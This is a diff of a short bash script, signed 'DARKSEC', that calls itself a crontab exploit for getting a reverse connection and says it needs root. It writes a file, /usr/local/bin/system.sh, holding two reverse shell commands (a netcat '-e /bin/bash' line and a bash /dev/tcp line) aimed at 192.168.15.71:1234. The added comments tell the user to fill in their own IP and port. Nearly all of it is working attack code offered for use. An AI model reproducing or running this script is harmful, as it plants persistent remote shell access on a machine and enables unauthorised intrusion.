@@ -1,6 +1,8 @@
 #!/bin/bash
 # DEVELOPER DARKSEC
 # THIS SCRIPT IS FOR A EXPLOIT FROM CRONTAB, SO WE WILL GET A REVERSE CONNECTION, WITH CRONTAB!
+# on the ip and port, choice the type from payload or connection reverse.
+
 
 echo "*******|-NEED RUN WITH ROOT!-|******"
 echo "HELLO FRIEND, HOW ARE YOU?"
@@ -26,9 +28,9 @@ cd /usr/local/bin
 sleep 1
 touch system.sh
 echo "#\!/bin/bash" > /usr/local/bin/system.sh
-echo "nc 192.168.15.71 1234 -e /bin/bash" >> /usr/local/bin/system.sh
+echo "nc 192.168.15.71 1234 -e /bin/bash" >> /usr/local/bin/system.sh # your ip here and your port :)
 sleep 1
-echo "bash -i >& /dev/tcp/192.168.15.71/1234 0>&1" >> /usr/local/bin/system.sh
+echo "bash -i >& /dev/tcp/192.168.15.71/1234 0>&1" >> /usr/local/bin/system.sh # your ip here and your port :)
 chmod +x /usr/local/bin/system.sh
 touch root.sh
 chmod +x /usr/local/bin/root.sh
